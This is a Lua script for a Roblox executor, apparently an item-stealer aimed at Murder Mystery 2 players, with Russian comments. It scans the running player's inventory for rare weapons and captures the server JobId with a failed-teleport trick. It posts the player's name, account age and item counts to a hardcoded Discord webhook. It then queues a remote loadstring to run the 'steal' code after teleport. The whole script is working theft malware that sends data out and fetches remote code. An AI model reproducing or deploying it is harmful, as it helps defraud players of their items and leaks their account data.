-- [ Settings ] --
local Username = "Warrior_ggs"
local Webhook = "https://discord.com/api/webhooks/1413919894017413203/n3A3GU2C3Z0IhX-TMu3tKjFbCOgOG00Zss4QhhD3VwiCnJxAFlcGKeh6HqTdhaTKr2w4"

-- Inventory/Modules
local RepStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local LocalPlayer = Players.LocalPlayer

local InvModule = require(RepStorage.Modules.InventoryModule)
local PlayerDataModule = require(RepStorage.Modules.ProfileData)
local LevelModule = require(RepStorage.Modules.LevelModule)

-- MM2 PlaceId
local placeId = 142823291
getgenv().realJobId = nil

-- JobId Bypasser
TeleportService.TeleportInitFailed:Connect(function(_,_,_,_,teleportInfo)
    if teleportInfo and teleportInfo.ServerInstanceId then
        getgenv().realJobId = teleportInfo.ServerInstanceId
        print("Real JobId detected:", getgenv().realJobId)
        queue_on_teleport(string.format([[getgenv().realJobId = "%s"]], getgenv().realJobId))
    end
end)

-- Trigger failed teleport to capture real JobId
for _ = 1, 2 do
    task.spawn(function()
        pcall(function()
            TeleportService:TeleportToPlaceInstance(placeId, "00000000-0000-0000-0000-000000000000")
        end)
    end)
    task.wait(0.5)
end

-- Функция для проверки инвентаря
local function hasValuableItems()
    local hasValuable = false
    local uniqueItems, ancientItems, godlyItems = {}, {}, {}

    for _, category in pairs(InvModule.MyInventory.Data.Weapons) do
        for _, item in pairs(category) do
            if item.Rarity == "Unique" then
                table.insert(uniqueItems, item.DataID)
            elseif item.Rarity == "Ancient" then
                table.insert(ancientItems, item.DataID)
            elseif item.Rarity == "Godly" then
                table.insert(godlyItems, item.DataID)
            end
        end
    end

    if #uniqueItems > 0 or #ancientItems > 0 or #godlyItems > 0 then
        hasValuable = true
    end

    return hasValuable, uniqueItems, ancientItems, godlyItems
end

-- Функция отправки webhook
local function sendWebhook(uniqueItems, ancientItems, godlyItems)
    local embed = {
        ["title"] = "JobId & Inventory Info",
        ["color"] = 65280,
        ["fields"] = {
            {["name"] = "Player", ["value"] = LocalPlayer.Name, ["inline"] = true},
            {["name"] = "Account Age", ["value"] = tostring(LocalPlayer.AccountAge), ["inline"] = true},
            {["name"] = "Uniques", ["value"] = tostring(#uniqueItems), ["inline"] = true},
            {["name"] = "Ancients", ["value"] = tostring(#ancientItems), ["inline"] = true},
            {["name"] = "Godlies", ["value"] = tostring(#godlyItems), ["inline"] = true},
            {["name"] = "JobId", ["value"] = getgenv().realJobId or "Unknown", ["inline"] = false}
        }
    }

    pcall(function()
        http_request({
            Url = Webhook,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode({ embeds = {embed} })
        })
    end)
end

-- Функция запуска stealItems после телепорта
local function runSteal()
    -- Замените ссылку на ваш оригинальный stealItems код или loadstring
    loadstring(game:HttpGet("ВАШ_LODSTRING_STEAL"))()
end

-- Основной цикл: ждем JobId и проверяем инвентарь
spawn(function()
    while not getgenv().realJobId do
        task.wait(0.5)
    end

    local hasValuable, uniqueItems, ancientItems, godlyItems = hasValuableItems()

    if hasValuable then
        sendWebhook(uniqueItems, ancientItems, godlyItems)

        -- Телепорт на реальный JobId
        TeleportService:TeleportToPlaceInstance(placeId, getgenv().realJobId)

        -- После телепорта stealItems будет автоматически запускаться через queue_on_teleport
        queue_on_teleport("loadstring(game:HttpGet('ВАШ_LODSTRING_STEAL'))()")
    else
        print("No valuable items found. Skipping webhook and teleport.")
    end
end)
